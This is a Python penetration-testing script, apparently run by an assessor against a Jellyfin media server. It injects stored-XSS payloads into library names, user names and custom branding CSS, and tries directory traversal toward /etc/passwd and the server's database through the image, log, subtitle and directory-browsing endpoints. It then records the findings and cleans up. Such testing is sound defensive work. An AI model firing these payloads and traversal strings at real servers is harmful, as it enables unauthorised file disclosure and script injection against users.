#!/usr/bin/env python3
"""
COBALT STRIKE II -- Phase 5: Stored XSS & Directory Traversal Testing
Tests injection via collection/library names, custom CSS, and path traversal.
"""

import sys
sys.path.insert(0, '/home/[REDACTED]/Desktop/[REDACTED-PATH]/JellyFin/scripts')

from jellyfin_common import *
import urllib.parse

banner("Phase 5: Stored XSS & Directory Traversal Testing")

ec = EvidenceCollector("phase5_xss_traversal", phase="phase5")
js = JellyfinSession()

if not js.test_connection():
    print("[-] Cannot connect to Jellyfin")
    sys.exit(1)


# ===========================================================================
# TEST 1: Stored XSS via collection/library names
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 1: Stored XSS via Library/Collection Names")
print("=" * 60)

xss_payloads = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '"><script>alert(1)</script>',
    "';alert(1)//",
    '<svg onload=alert(1)>',
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
]

print("\n  Testing XSS via library names:\n")

created_libs = []

for i, payload in enumerate(xss_payloads):
    try:
        name = f"XSSTest{i}_{payload[:15]}"
        # Try to create a virtual folder with XSS name
        resp = js.post(
            f"/Library/VirtualFolders?name={urllib.parse.quote(payload)}"
            f"&collectionType=movies&refreshLibrary=false",
            data={"LibraryOptions": {"PathInfos": [{"Path": f"/media/movies"}]}},
        )
        status = resp.status_code

        if status in (200, 204):
            created_libs.append(payload)
            print(f"  [!!] Library created with name: {payload[:50]}")

            # Fetch it back to see if payload is preserved
            libs_resp = js.get("/Library/VirtualFolders")
            if libs_resp.status_code == 200:
                for lib in libs_resp.json():
                    if payload[:10] in lib.get("Name", ""):
                        print(f"       Stored as: {lib['Name'][:60]}")

                        # Check if it's rendered in the HTML
                        web_resp = js.raw_get("/web/index.html")
                        if web_resp.status_code == 200 and payload[:10] in web_resp.text:
                            print(f"       [!!] PAYLOAD IN WEB UI HTML!")
                            ec.add_finding(
                                f"XSS-LIB-{i}",
                                "HIGH",
                                f"Stored XSS via library name: {payload[:30]}",
                                f"Library created with name containing XSS payload. "
                                f"Payload preserved in response.",
                            )
        elif status == 400:
            print(f"  [  ] Rejected: {payload[:50]}")
        else:
            print(f"  [  ] HTTP {status}: {payload[:50]} -- {resp.text[:80]}")

        ec.add_test(
            f"XSS-LIB-{i}",
            f"XSS in library name: {payload[:25]}",
            f"POST /Library/VirtualFolders?name={payload[:30]}",
            f"HTTP {status}",
            result="ANOMALOUS" if status in (200, 204) else "PASS",
        )

        rate_limit(0.3)
    except Exception as e:
        print(f"  [!!] Error: {e}")


# ===========================================================================
# TEST 2: XSS via custom CSS (Branding)
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 2: XSS via Custom CSS Branding")
print("=" * 60)

print("\n  Testing CSS injection via Branding configuration:\n")

css_payloads = [
    {
        "name": "import_external",
        "css": "@import url('http://127.0.0.1:9999/evil.css');",
        "desc": "CSS @import external URL",
    },
    {
        "name": "expression_ie",
        "css": "body { background: expression(alert(1)); }",
        "desc": "CSS expression (IE legacy)",
    },
    {
        "name": "url_javascript",
        "css": "body { background: url('javascript:alert(1)'); }",
        "desc": "CSS url() with javascript: scheme",
    },
    {
        "name": "content_injection",
        "css": 'body::after { content: "</style><script>alert(1)</script>"; }',
        "desc": "CSS content with HTML injection",
    },
]

# Save original branding
orig_branding = js.get("/Branding/Configuration").json() if js.get("/Branding/Configuration").status_code == 200 else {}

for payload in css_payloads:
    try:
        # Update branding CSS
        branding_data = {
            "LoginDisclaimer": "",
            "CustomCss": payload["css"],
            "SplashscreenEnabled": False,
        }
        resp = js.post("/Branding/Configuration", data=branding_data)
        status = resp.status_code

        if status == 204:
            # Fetch the CSS back -- it's served unauthenticated
            css_resp = js.raw_get("/Branding/Css")
            if css_resp.status_code == 200:
                served_css = css_resp.text
                print(f"  [!!] {payload['name']}: CSS accepted and served")
                print(f"       Served: {served_css[:80]}")

                # Check if dangerous patterns are preserved
                if "@import" in served_css or "expression" in served_css or "javascript:" in served_css:
                    print(f"       [!!] DANGEROUS CSS SERVED UNAUTHENTICATED")
                    ec.add_finding(
                        f"CSS-{payload['name']}",
                        "MEDIUM",
                        f"CSS injection via branding: {payload['desc']}",
                        f"Custom CSS containing {payload['name']} is stored and "
                        f"served unauthenticated at /Branding/Css. "
                        f"CSS: {served_css[:200]}",
                        remediation="Sanitize custom CSS to strip @import, "
                                   "expression(), and javascript: URLs.",
                    )
            else:
                print(f"  [  ] {payload['name']}: CSS set but Css endpoint returned {css_resp.status_code}")
        else:
            print(f"  [  ] {payload['name']}: HTTP {status}")

        ec.add_test(
            f"CSS-{payload['name']}",
            f"CSS injection: {payload['desc'][:35]}",
            f"POST /Branding/Configuration CustomCss={payload['css'][:40]}",
            f"HTTP {status}",
            result="ANOMALOUS" if status == 204 else "PASS",
        )

        rate_limit(0.3)
    except Exception as e:
        print(f"  [!!] Error: {e}")

# Restore original branding
try:
    js.post("/Branding/Configuration", data=orig_branding)
    print("\n  Restored original branding config")
except:
    pass


# ===========================================================================
# TEST 3: XSS via user display name
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 3: XSS via User Display Name")
print("=" * 60)

xss_names = [
    '<script>alert("XSS")</script>',
    '<img src=x onerror=alert(1)>',
    '"><svg/onload=alert(1)>',
]

for name_payload in xss_names:
    try:
        user_id = create_test_user(js, username=f"test_{xss_names.index(name_payload)}", password="Test123")
        if user_id:
            # Try to update display name
            user_data = js.get(f"/Users/{user_id}").json() if js.get(f"/Users/{user_id}").status_code == 200 else {}
            if user_data:
                user_data["Name"] = name_payload
                resp = js.post(f"/Users/{user_id}", data=user_data)
                if resp.status_code in (200, 204):
                    # Verify stored
                    verify = js.get(f"/Users/{user_id}")
                    if verify.status_code == 200:
                        stored_name = verify.json().get("Name", "")
                        print(f"  Stored name: {stored_name[:60]}")
                        if "<" in stored_name and ">" in stored_name:
                            print(f"  [!!] XSS payload preserved in user name")
                else:
                    print(f"  Name update: HTTP {resp.status_code}")
            # Cleanup
            js.delete(f"/Users/{user_id}")
    except Exception as e:
        print(f"  [!!] Error: {e}")


# ===========================================================================
# TEST 4: Directory traversal via API endpoints
# ===========================================================================

print("\n" + "=" * 60)
print("  TEST 4: Directory Traversal")
print("=" * 60)

print("\n  Testing path traversal in various endpoints:\n")

traversal_payloads = [
    "../../../../../../etc/passwd",
    "..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
    "....//....//....//....//etc/passwd",
    "%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",
    "..\\..\\..\\..\\..\\etc\\passwd",
]

# Test against various endpoints that accept file paths
traversal_endpoints = [
    # Image endpoints
    ("/Items/{id}/Images/Primary?tag={path}", "Item image with path"),
    # System logs
    ("/System/Logs/Log?name={path}", "System log download"),
    # Subtitle download
    ("/Videos/{id}/Subtitles/0/0/Stream.srt?fileName={path}", "Subtitle with path"),
    # Environment directory browser
    ("/Environment/DirectoryContents?path={path}", "Directory browser"),
    # Library path
    ("/Library/VirtualFolders?path={path}", "Library virtual folder path"),
]

movie_id = None
resp = js.get("/Items", params={"Recursive": "true", "IncludeItemTypes": "Movie", "Limit": "1"})
if resp.status_code == 200:
    items = resp.json().get("Items", [])
    if items:
        movie_id = items[0]["Id"]

for endpoint_template, desc in traversal_endpoints:
    for payload in traversal_payloads[:3]:  # Test first 3 traversal patterns
        try:
            endpoint = endpoint_template.replace("{id}", movie_id or "test").replace("{path}", payload)

            resp = js.get(endpoint)
            status = resp.status_code
            content = resp.text[:200]

            is_traversal = status == 200 and ("root:" in content or "bin/bash" in content
                                               or "PATH=" in content)

            if is_traversal:
                print(f"  [!!] TRAVERSAL: {desc} with {payload[:30]}")
                print(f"       Content: {content[:100]}")
                ec.add_finding(
                    f"TRAVERSAL-{desc[:15]}",
                    "CRITICAL",
                    f"Directory traversal: {desc}",
                    f"Path traversal via {endpoint[:60]} returned sensitive file content.",
                    evidence=content[:500],
                )
            elif status == 200 and len(resp.content) > 100:
                print(f"  [?]  {desc}: {payload[:30]} -> {status} ({len(resp.content)} bytes)")
            elif status not in (200, 301, 302):
                pass  # Expected rejection

            rate_limit(0.1)
        except Exception as e:
            pass

# Special test: /Environment/DirectoryContents
print("\n  Testing /Environment/DirectoryContents:\n")
dir_paths = ["/etc", "/config", "/media", "/proc", "/config/data"]
for path in dir_paths:
    try:
        resp = js.get("/Environment/DirectoryContents", params={"path": path})
        if resp.status_code == 200:
            items = resp.json()
            print(f"  [!!] {path}: {len(items)} entries visible")
            for item in items[:3]:
                print(f"       {item.get('Name','?')} ({item.get('Type','?')})")
            if len(items) > 3:
                print(f"       ... and {len(items)-3} more")

            ec.add_test(
                f"DIRBROWSE-{path.replace('/','_')[:15]}",
                f"Directory browse: {path}",
                f"GET /Environment/DirectoryContents?path={path}",
                f"HTTP 200: {len(items)} entries",
                result="ANOMALOUS" if path in ["/etc", "/proc"] else "PASS",
            )
        else:
            print(f"  [  ] {path}: HTTP {resp.status_code}")
        rate_limit(0.2)
    except Exception as e:
        print(f"  [!!] Error: {e}")


# Special test: /System/Logs/Log
print("\n  Testing /System/Logs/Log with path traversal:\n")
log_payloads = [
    ("log_20260302.log", "Normal log file"),
    ("../data/jellyfin.db", "SQLite database via traversal"),
    ("../../etc/passwd", "etc/passwd via traversal"),
    ("log_20260302.log/../../../etc/passwd", "Traversal in log name"),
]

for log_path, desc in log_payloads:
    try:
        resp = js.get("/System/Logs/Log", params={"name": log_path})
        status = resp.status_code
        content = resp.text[:200]

        has_sensitive = "root:" in content or "SQLite" in content
        if has_sensitive:
            print(f"  [!!] {desc}: HTTP {status} ({len(resp.content)} bytes) - SENSITIVE CONTENT")
            ec.add_finding(
                f"LOGTRAVERSAL-{desc[:15]}",
                "HIGH",
                f"Path traversal via log download: {desc}",
                f"GET /System/Logs/Log?name={log_path} returned sensitive content.",
                evidence=content[:500],
            )
        elif status == 200:
            print(f"  [  ] {desc}: HTTP {status} ({len(resp.content)} bytes)")
        else:
            print(f"  [  ] {desc}: HTTP {status}")

        rate_limit(0.2)
    except Exception as e:
        print(f"  [!!] Error: {e}")


# ===========================================================================
# CLEANUP: Remove XSS test libraries
# ===========================================================================

print("\n" + "=" * 60)
print("  CLEANUP")
print("=" * 60)

for lib_name in created_libs:
    try:
        resp = js.delete(f"/Library/VirtualFolders?name={urllib.parse.quote(lib_name)}&refreshLibrary=false")
        print(f"  Delete lib '{lib_name[:30]}': HTTP {resp.status_code}")
    except:
        pass


# ===========================================================================
# SUMMARY
# ===========================================================================

print("\n" + "=" * 60)
print("  PHASE 5 SUMMARY")
print("=" * 60)

ec.save()
